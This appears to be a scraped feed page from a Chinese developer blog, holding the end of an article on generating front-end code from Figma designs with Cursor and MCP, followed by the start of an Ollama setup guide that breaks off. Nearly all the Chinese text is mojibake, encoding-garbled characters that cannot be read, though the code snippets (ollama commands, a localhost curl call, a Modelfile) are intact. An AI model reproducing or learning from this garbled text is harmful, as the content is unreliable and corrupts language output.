<p><strong>åŸå› </strong>ï¼šè®¾è®¡æ–‡ä»¶åŒ…å«ä¸Šç™¾ä¸ªé¡µé¢/ç»„ä»¶</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># æ–¹æ¡ˆ1ï¼šæŒ‡å®šå…·ä½“é¡µé¢</span>
@figma åªåˆ†æ<span class="hljs-string">"Landing Page"</span>è¿™ä¸ªé¡µé¢

<span class="hljs-comment"># æ–¹æ¡ˆ2ï¼šåˆ†æ‰¹å¤„ç†</span>
@figma å…ˆåˆ†æHeroå’ŒFeatureséƒ¨åˆ†
<span class="hljs-comment"># å®Œæˆåå†æ‰§è¡Œ</span>
@figma åˆ†æPricingå’ŒFooteréƒ¨åˆ†
</code></pre>
<h3 data-id="heading-26">é—®é¢˜3ï¼šè®¾è®¡ä¸è§„èŒƒå¯¼è‡´è¯†åˆ«é”™è¯¯</h3>
<p><strong>ç°è±¡</strong>ï¼šç”Ÿæˆçš„å¸ƒå±€ä¹±äº†ï¼Œé—´è·ä¸å¯¹</p>
<p><strong>åŸå› </strong>ï¼šè®¾è®¡å¸ˆæ²¡ç”¨Auto Layoutï¼Œè€Œæ˜¯ç”¨äº†ç»å¯¹å®šä½</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
å’Œè®¾è®¡å¸ˆæ²Ÿé€šï¼Œè¯·ä»–ä»¬è§„èŒƒè®¾è®¡æ–‡ä»¶ï¼š</p>
<ul>
<li>âœ… ç»Ÿä¸€ä½¿ç”¨Auto Layout</li>
<li>âœ… ç»„ä»¶åŒ–é‡å¤å…ƒç´ </li>
<li>âœ… è§„èŒƒå‘½åï¼ˆæ¸…æ™°çš„å›¾å±‚åï¼‰</li>
<li>âœ… å®šä¹‰å®Œæ•´çš„Design Token</li>
<li>âŒ ä¸è¦ç”¨ç»å¯¹å®šä½</li>
<li>âŒ é¿å…è¿‡åº¦åµŒå¥—ï¼ˆè¶…è¿‡5å±‚ï¼‰</li>
</ul>

**ç»™è®¾è®¡å¸ˆçš„å»ºè®®**ï¼šæŠŠFigmaæ–‡ä»¶å½“ä½œ"ä»£ç "æ¥ç»„ç»‡ï¼Œè¶Šè§„èŒƒï¼ŒAIè¿˜åŸåº¦è¶Šé«˜ï¼

<h3 data-id="heading-27">é—®é¢˜4ï¼šç”Ÿæˆçš„ä»£ç ä¸ç¬¦åˆé¡¹ç›®è§„èŒƒ</h3>
<p><strong>ç°è±¡</strong>ï¼šå‘½åé£æ ¼ã€ç›®å½•ç»“æ„å’Œç°æœ‰é¡¹ç›®ä¸ä¸€è‡´</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
åœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»º <code>.cursorrules</code> æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># é¡¹ç›®è§„èŒƒ</span>

<span class="hljs-section">## ç»„ä»¶è§„èŒƒ</span>
<span class="hljs-bullet">-</span> ç»„ä»¶æ–‡ä»¶åä½¿ç”¨PascalCase
<span class="hljs-bullet">-</span> æ”¾åœ¨ src/components ç›®å½•
<span class="hljs-bullet">-</span> æ¯ä¸ªç»„ä»¶ç‹¬ç«‹ç›®å½•ï¼ŒåŒ…å«index.tsxå’Œstyles.ts

<span class="hljs-section">## æ ·å¼è§„èŒƒ</span>
<span class="hljs-bullet">-</span> ä½¿ç”¨styled-components
<span class="hljs-bullet">-</span> ä¸ä½¿ç”¨TailwindCSS
<span class="hljs-bullet">-</span> é¢œè‰²ä½¿ç”¨CSSå˜é‡

<span class="hljs-section">## æµ‹è¯•è§„èŒƒ</span>
<span class="hljs-bullet">-</span> æ¯ä¸ªç»„ä»¶å¿…é¡»æœ‰æµ‹è¯•æ–‡ä»¶
<span class="hljs-bullet">-</span> ä½¿ç”¨React Testing Library
<span class="hljs-bullet">-</span> è¦†ç›–ç‡ä¸ä½äº80%

ç”Ÿæˆä»£ç æ—¶ä¸¥æ ¼éµå¾ªä»¥ä¸Šè§„èŒƒï¼
</code></pre>
<p>æœ‰äº†è¿™ä¸ªæ–‡ä»¶ï¼ŒAIä¼šè‡ªåŠ¨éµå¾ªä½ çš„è§„èŒƒã€‚</p>
<h2 data-id="heading-28">æ•ˆç‡å¯¹æ¯”å’ŒçœŸå®æ¡ˆä¾‹</h2>
<p>è®©æˆ‘ä»¬ç”¨æ•°æ®è¯´è¯ï¼Œçœ‹çœ‹çœŸå®çš„æ•ˆç‡æå‡ã€‚</p>
<h3 data-id="heading-29">çœŸå®æ¡ˆä¾‹ï¼šç”µå•†é¦–é¡µé‡æ„</h3>
<p><strong>é¡¹ç›®èƒŒæ™¯</strong>ï¼š</p>
<ul>
<li>æŸç”µå•†å¹³å°é¦–é¡µé‡æ„</li>
<li>è®¾è®¡å¸ˆç»™äº†å®Œæ•´çš„Figmaè®¾è®¡ç¨¿</li>
<li>åŒ…å«ï¼šå¯¼èˆªæ ã€Bannerã€å•†å“åˆ†ç±»ã€æ¨èå•†å“ã€æ´»åŠ¨åŒºåŸŸã€é¡µè„š</li>
<li>å…±15ä¸ªç»„ä»¶</li>
</ul>
<p><strong>å¯¹æ¯”æ•°æ®</strong>ï¼š</p>















































<table><thead><tr><th align="left">é˜¶æ®µ</th><th align="right">ä¼ ç»Ÿå¼€å‘</th><th align="right">Cursor+MCP</th><th align="right">èŠ‚çœæ—¶é—´</th></tr></thead><tbody><tr><td align="left">è®¾è®¡è§£è¯»</td><td align="right">2å°æ—¶</td><td align="right">10åˆ†é’Ÿ</td><td align="right">1.9å°æ—¶</td></tr><tr><td align="left">æ­å»ºåŸºç¡€ç»“æ„</td><td align="right">3å°æ—¶</td><td align="right">30åˆ†é’Ÿ</td><td align="right">2.5å°æ—¶</td></tr><tr><td align="left">ç»„ä»¶å¼€å‘</td><td align="right">2å¤©(16å°æ—¶)</td><td align="right">4å°æ—¶</td><td align="right">12å°æ—¶</td></tr><tr><td align="left">å“åº”å¼é€‚é…</td><td align="right">6å°æ—¶</td><td align="right">1å°æ—¶</td><td align="right">5å°æ—¶</td></tr><tr><td align="left">å¯¹é½è°ƒæ•´</td><td align="right">4å°æ—¶</td><td align="right">30åˆ†é’Ÿ</td><td align="right">3.5å°æ—¶</td></tr><tr><td align="left"><strong>æ€»è®¡</strong></td><td align="right"><strong>31å°æ—¶</strong></td><td align="right"><strong>6.5å°æ—¶</strong></td><td align="right"><strong>24.5å°æ—¶</strong></td></tr></tbody></table>
<p><strong>æ•ˆç‡æå‡</strong>ï¼š<strong>4.8å€</strong>ï¼</p>
<p><strong>ä»£ç è´¨é‡å¯¹æ¯”</strong>ï¼š</p>



































<table><thead><tr><th align="left">ç»´åº¦</th><th align="center">ä¼ ç»Ÿå¼€å‘</th><th align="center">Cursor+MCP</th></tr></thead><tbody><tr><td align="left">åƒç´ è¿˜åŸåº¦</td><td align="center">85%</td><td align="center">98%</td></tr><tr><td align="left">TypeScriptè¦†ç›–</td><td align="center">60%</td><td align="center">100%</td></tr><tr><td align="left">ç»„ä»¶å¤ç”¨ç‡</td><td align="center">40%</td><td align="center">80%</td></tr><tr><td align="left">å¯è®¿é—®æ€§è¯„åˆ†</td><td align="center">72/100</td><td align="center">94/100</td></tr><tr><td align="left">Bugæ•°é‡</td><td align="center">18ä¸ª</td><td align="center">3ä¸ª</td></tr></tbody></table>
<h2 data-id="heading-30">æ€»ç»“ï¼šè®¾è®¡åˆ°ä»£ç çš„èŒƒå¼è½¬å˜</h2>
<p>å†™åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»å®Œæ•´ä½“éªŒäº† <strong>Cursor + MCP</strong> çš„å¼ºå¤§èƒ½åŠ›ã€‚</p>
<p>è®©æˆ‘æ€»ç»“ä¸€ä¸‹å…³é”®æ”¶è·ï¼š</p>
<h3 data-id="heading-31">ä¸‰å¤§æ ¸å¿ƒä»·å€¼</h3>
<ol>
<li><strong>æ•ˆç‡é©å‘½</strong>ï¼šå¼€å‘æ—¶é—´ä»å¤©é™åˆ°å°æ—¶</li>
<li><strong>è´¨é‡æå‡</strong>ï¼šåƒç´ çº§è¿˜åŸ + ç”Ÿäº§çº§ä»£ç </li>
<li><strong>æµç¨‹ä¼˜åŒ–</strong>ï¼šè®¾è®¡-å¼€å‘æ— ç¼è¡”æ¥</li>
</ol>
<h3 data-id="heading-32">é€‚ç”¨åœºæ™¯</h3>
<p><strong>âœ… é€‚åˆç”¨Cursor+MCPçš„åœºæ™¯ï¼š</strong></p>
<ul>
<li>UIå¯†é›†å‹é¡¹ç›®ï¼ˆè½åœ°é¡µã€è¥é”€é¡µé¢ï¼‰</li>
<li>è®¾è®¡è§„èŒƒçš„ä¸­åå°ç³»ç»Ÿ</li>
<li>éœ€è¦å¿«é€Ÿäº¤ä»˜çš„MVP</li>
<li>è®¾è®¡é¢‘ç¹å˜æ›´çš„é¡¹ç›®</li>
</ul>
<p><strong>âŒ ä¸å¤ªé€‚åˆçš„åœºæ™¯ï¼š</strong></p>
<ul>
<li>é«˜åº¦å®šåˆ¶åŒ–çš„äº¤äº’ï¼ˆå¦‚æ¸¸æˆã€å¯è§†åŒ–ç¼–è¾‘å™¨ï¼‰</li>
<li>è®¾è®¡ç¨¿ä¸è§„èŒƒçš„é¡¹ç›®</li>
<li>æ²¡æœ‰Figmaæ–‡ä»¶çš„é¡¹ç›®</li>
</ul>
<h3 data-id="heading-33">æˆ‘è¸©è¿‡çš„å‘ï¼Œä½ ä¸ç”¨è¸©</h3>
<ol>
<li><strong>ä¸è¦å®Œå…¨ä¾èµ–AI</strong>ï¼šç”Ÿæˆçš„ä»£ç è¦reviewï¼Œç‰¹åˆ«æ˜¯ä¸šåŠ¡é€»è¾‘éƒ¨åˆ†</li>
<li><strong>å’Œè®¾è®¡å¸ˆæ²Ÿé€š</strong>ï¼šè®©ä»–ä»¬è§„èŒƒåŒ–Figmaæ–‡ä»¶ï¼Œä¼šäº‹åŠåŠŸå€</li>
<li><strong>å»ºç«‹è®¾è®¡ç³»ç»Ÿ</strong>ï¼šä¸€å¼€å§‹èŠ±æ—¶é—´å»ºç«‹Design Systemï¼Œåé¢ä¼šè¶Šæ¥è¶Šå¿«</li>
<li><strong>ç‰ˆæœ¬æ§åˆ¶</strong>ï¼šè®°å¾—commitï¼ŒAIæ”¹é”™äº†å¯ä»¥å›é€€</li>
</ol>

**é‡è¦æé†’**ï¼šAIæ˜¯åŠ©æ‰‹ï¼Œä¸æ˜¯æ›¿ä»£ã€‚ä½ çš„ä»£ç å®¡æŸ¥èƒ½åŠ›ã€æ¶æ„æ€ç»´ã€ä¸šåŠ¡ç†è§£ä¾ç„¶ä¸å¯æˆ–ç¼ºã€‚

<h2 data-id="heading-34">ä¸‹ä¸€æ­¥ï¼šç»§ç»­æ¢ç´¢</h2>
<p>è¿™åªæ˜¯ã€ŠCursorè¿›é˜¶å®æˆ˜ã€‹ç³»åˆ—çš„ç¬¬ä¸€ç¯‡ï¼Œæˆ‘ä»¬ä»…ä»…è§¦åŠäº†Cursorèƒ½åŠ›çš„å†°å±±ä¸€è§’ã€‚</p>
<h3 data-id="heading-35">æœ¬ç³»åˆ—åç»­å†…å®¹é¢„å‘Š</h3>
<p><strong>ä¸‹ä¸€ç¯‡ï¼šã€Cursorè¿›é˜¶å®æˆ˜Â·02ã€‘å‘Šåˆ«ä¸‘é™‹ç•Œé¢ï¼ç”¨Cursoræ‰“é€ å®¡ç¾åœ¨çº¿çš„ç°ä»£åŒ–UI</strong></p>
<ul>
<li>ä¸ä¾èµ–è®¾è®¡å¸ˆï¼Œå¦‚ä½•è‡ªå·±åšå‡ºé«˜çº§æ„Ÿç•Œé¢</li>
<li>Dribbble + AI = æ— é™è®¾è®¡çµæ„Ÿ</li>
<li>20åˆ†é’Ÿæ‰“é€ Notioné£æ ¼ä»ªè¡¨ç›˜</li>
</ul>
<p><strong>ç¬¬ä¸‰ç¯‡ï¼šã€Cursorè¿›é˜¶å®æˆ˜Â·03ã€‘Cursorå››å¤§æ¨¡å¼å®Œå…¨æŒ‡å—</strong></p>
<ul>
<li>Agent/Plan/Debug/Askæ¨¡å¼æ·±åº¦è§£æ</li>
<li>ä»€ä¹ˆåœºæ™¯ç”¨ä»€ä¹ˆæ¨¡å¼</li>
<li>æ¨¡å¼é€‰å¯¹ï¼Œæ•ˆç‡ç¿»å€</li>
</ul>
<h3 data-id="heading-36">ç»§ç»­å­¦ä¹ èµ„æº</h3>
<ul>
<li><strong>Cursorå®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fdocs" target="_blank" title="https://cursor.com/docs" ref="nofollow noopener noreferrer">cursor.com/docs</a></li>
<li><strong>MCPåè®®æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io" target="_blank" title="https://modelcontextprotocol.io" ref="nofollow noopener noreferrer">modelcontextprotocol.io</a></li>
</ul>
<h3 data-id="heading-37">åŠ¨æ‰‹å®è·µ</h3>
<p><strong>ä»Šå¤©å°±è¯•è¯•</strong>ï¼š</p>
<ol>
<li>æ‰¾ä¸€ä¸ªFigmaè®¾è®¡æ–‡ä»¶ï¼ˆå¯ä»¥ç”¨æˆ‘æä¾›çš„ç¤ºä¾‹ï¼‰</li>
<li>æŒ‰ç…§æœ¬æ–‡æ­¥éª¤é…ç½®Cursor MCP</li>
<li>å°è¯•è®©AIè¿˜åŸä¸€ä¸ªç®€å•çš„ç»„ä»¶</li>
<li>æ„Ÿå—ä¸€ä¸‹æ•ˆç‡çš„æå‡</li>
</ol>
<p><strong>åˆ†äº«ä½ çš„æˆæœ</strong>ï¼š</p>
<ul>
<li>åœ¨è¯„è®ºåŒºç•™ä¸‹ä½ çš„å®è·µç»å†</li>
<li>é‡åˆ°é—®é¢˜å¯ä»¥åœ¨ä¸‹æ–¹æé—®</li>
<li>åˆ†äº«ä½ çš„æ•ˆç‡æå‡æ•°æ®</li>
</ul>
<hr/>
<p><em>æ„Ÿè°¢é˜…è¯»ï¼å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ç‚¹èµã€æ”¶è—ã€åˆ†äº«ã€‚æˆ‘ä»¬ä¸‹æœŸè§ï¼ğŸ‘‹</em></p>
<p><em>æœ‰é—®é¢˜æ¬¢è¿åœ¨è¯„è®ºåŒºè®¨è®ºï¼Œæˆ‘ä¼šå°½é‡å›å¤æ¯ä¸€æ¡è¯„è®ºã€‚</em></p>
<h3 data-id="heading-38">ğŸ‰ æ„Ÿè°¢å…³æ³¨,è®©æˆ‘ä»¬ä¸€èµ·äº«å—æŠ€æœ¯å¸¦æ¥çš„ç²¾å½©!</h3>
<h3 data-id="heading-39"><strong>æˆ‘åšäº†ä¸€ä¸ªä¸ªäººä¸»é¡µï¼Œèƒ½æ‰¾åˆ°æ‰€æœ‰æˆ‘æä¾›ç»™ä½ çš„èµ„æº</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µ</a></h3></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ« Ollama åŸºç¡€ä½¿ç”¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7589092567545020425</link>    <guid>https://juejin.cn/post/7589092567545020425</guid>    <pubDate>2025-12-29T14:19:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589092567545020425" data-draft-id="7589126920286486538" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ« Ollama åŸºç¡€ä½¿ç”¨æŒ‡å—"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,Python"/> <meta itemprop="datePublished" content="2025-12-29T14:19:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Csvn"/> <meta itemprop="url" content="https://juejin.cn/user/1398234521023352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ« Ollama åŸºç¡€ä½¿ç”¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1398234521023352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Csvn
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:19:56.000Z" title="Mon Dec 29 2025 14:19:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ« Ollama åŸºç¡€ä½¿ç”¨æŒ‡å—ï¼ˆMac / Linux / Windowsï¼‰</h2>
<blockquote>
<p>Ollama æ˜¯ä¸€ä¸ªåœ¨æœ¬åœ°è¿è¡Œå¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰çš„å·¥å…·ï¼Œæ”¯æŒ macOSã€Linux å’Œ Windowsã€‚<br/>
å®ƒè®©æ™®é€šç”¨æˆ·ä¹Ÿèƒ½åœ¨ç¬”è®°æœ¬ä¸Šè½»æ¾è¿è¡Œ Llamaã€Qwenã€Gemmaã€Phi ç­‰å¼€æºæ¨¡å‹ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">ğŸ“¦ 1. å®‰è£… Ollama</h3>
<h4 data-id="heading-2">macOSï¼ˆæ¨èï¼‰</h4>
<pre><code class="hljs">brew install ollama
</code></pre>
<p>æˆ–è®¿é—®å®˜ç½‘ä¸‹è½½ï¼š<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">ollama.com</a></p>
<h4 data-id="heading-3">å¯åŠ¨æœåŠ¡ï¼ˆmacOS è‡ªåŠ¨åå°è¿è¡Œï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash">ollama serve  <span class="hljs-comment"># é€šå¸¸ä¸éœ€è¦æ‰‹åŠ¨è¿è¡Œï¼Œå®‰è£…åè‡ªåŠ¨å¯åŠ¨</span>
</code></pre>
<hr/>
<h3 data-id="heading-4">â–¶ï¸ 2. åŸºæœ¬å‘½ä»¤</h3>





























<table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>ollama list</code></td><td>æŸ¥çœ‹å·²å®‰è£…çš„æ¨¡å‹</td></tr><tr><td><code>ollama pull &lt;model&gt;</code></td><td>ä¸‹è½½æ¨¡å‹ï¼ˆå¦‚Â <code>qwen3:8b</code>ï¼‰</td></tr><tr><td><code>ollama run &lt;model&gt;</code></td><td>è¿è¡Œæ¨¡å‹å¹¶è¿›å…¥äº¤äº’æ¨¡å¼</td></tr><tr><td><code>ollama rm &lt;model&gt;</code></td><td>åˆ é™¤æ¨¡å‹</td></tr><tr><td><code>ollama show &lt;model&gt;</code></td><td>æŸ¥çœ‹æ¨¡å‹ä¿¡æ¯ï¼ˆå¦‚å‚æ•°ã€æ¨¡æ¿ï¼‰</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-5">ğŸŒ 3. å¸¸ç”¨æ¨¡å‹ç¤ºä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸­æ–‡å¼ºæ¨¡å‹ï¼ˆé€šä¹‰åƒé—®ï¼‰</span>
ollama pull qwen3:8b

<span class="hljs-comment"># è½»é‡ä¸­æ–‡æ¨¡å‹</span>
ollama pull qwen:4b

<span class="hljs-comment"># Meta å®˜æ–¹æ¨¡å‹</span>
ollama pull llama3.2:1b      <span class="hljs-comment"># è¶…è½»é‡</span>
ollama pull llama3.2:3b
ollama pull llama3.1:8b      <span class="hljs-comment"># æ¨èå¹³è¡¡æ¬¾</span>
ollama pull llama3.1:70b     <span class="hljs-comment"># é«˜æ€§èƒ½ï¼ˆéœ€å¤§å†…å­˜ï¼‰</span>

<span class="hljs-comment"># Google è½»é‡æ¨¡å‹</span>
ollama pull gemma2:2b
ollama pull gemma2:9b

<span class="hljs-comment"># å¾®è½¯å°æ¨¡å‹</span>
ollama pull phi3:mini
ollama pull phi3:medium
</code></pre>
<blockquote>
<p>ğŸ’¡ æ‰€æœ‰æ¨¡å‹åˆ—è¡¨ï¼š<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">ollama.com/library</a></p>
</blockquote>
<hr/>
<h3 data-id="heading-6">ğŸ’¬ 4. äº¤äº’å¼å¯¹è¯</h3>
<pre><code class="hljs language-shell" lang="shell">ollama run qwen3:8b
<span class="hljs-meta prompt_">&gt;</span><span class="bash">&gt;&gt; ä½ å¥½ï¼</span>
<span class="hljs-meta prompt_">&gt;</span><span class="bash">&gt;&gt; è¯·ç”¨ Python å†™ä¸€ä¸ªå¿«æ’ã€‚</span>
<span class="hljs-meta prompt_">&gt;</span><span class="bash">&gt;&gt; /bye   <span class="hljs-comment"># é€€å‡º</span></span>
</code></pre>
<p>æ”¯æŒå¤šè½®å¯¹è¯ï¼Œä¸Šä¸‹æ–‡è‡ªåŠ¨ä¿ç•™ã€‚</p>
<hr/>
<h3 data-id="heading-7">ğŸ¤– 5. éäº¤äº’å¼è°ƒç”¨ï¼ˆè„šæœ¬/è‡ªåŠ¨åŒ–ï¼‰</h3>
<h4 data-id="heading-8">æ–¹å¼ä¸€ï¼šç®¡é“è¾“å…¥</h4>
<pre><code class="hljs language-arduino" lang="arduino">echo <span class="hljs-string">"1+1ç­‰äºå‡ ï¼Ÿ"</span> | ollama run qwen3:<span class="hljs-number">8b</span>
</code></pre>
<h4 data-id="heading-9">æ–¹å¼äºŒï¼šAPI è°ƒç”¨ï¼ˆæœ¬åœ° HTTPï¼‰</h4>
<p>Ollama é»˜è®¤å¯åŠ¨ <code>http://localhost:11434</code> APIã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet">curl http://localhost:<span class="hljs-number">11434</span>/api/generate -d <span class="hljs-comment">'{</span>
  <span class="hljs-string">"model"</span>: <span class="hljs-string">"qwen3:8b"</span>,
  <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"è§£é‡Šé‡å­è®¡ç®—"</span>,
  <span class="hljs-string">"stream"</span>: <span class="hljs-literal">false</span>
}<span class="hljs-comment">'</span>
</code></pre>
<p>è¿”å› JSON æ ¼å¼ç»“æœã€‚</p>
<hr/>
<h3 data-id="heading-10">ğŸ§© 6. åˆ›å»ºè‡ªå®šä¹‰æ¨¡å‹ï¼ˆModelfileï¼‰</h3>
<p>ä½ å¯ä»¥åŸºäºç°æœ‰æ¨¡å‹å¾®è°ƒæç¤ºè¯ã€å‚æ•°ç­‰ã€‚</p>
<h4 data-id="heading-11">ç¤ºä¾‹ï¼š<code>Modelfile</code></h4>
<pre><code class="hljs language-python" lang="python">FROM qwen3:8b

<span class="hljs-comment"># è®¾ç½®ç³»ç»Ÿæç¤º</span>
SYSTEM <span class="hljs-string">"""
ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šã€ç®€æ´ã€å‡†ç¡®çš„ AI åŠ©æ‰‹ï¼Œæ“…é•¿æŠ€æœ¯è§£ç­”ã€‚
å›ç­”æ—¶é¿å…å†—é•¿ï¼Œä¼˜å…ˆä½¿ç”¨ä»£ç æˆ–åˆ—è¡¨ã€‚
"""</span>

<span class="hljs-comment"># é»˜è®¤å‚æ•°</span>
PARAMETER temperature <span class="hljs-number">0.5</span>
PARAMETER num_ctx <span class="hljs-number">4096</span>
</code></pre>
<h4 data-id="heading-12">æ„å»ºå¹¶è¿è¡Œ</h4>
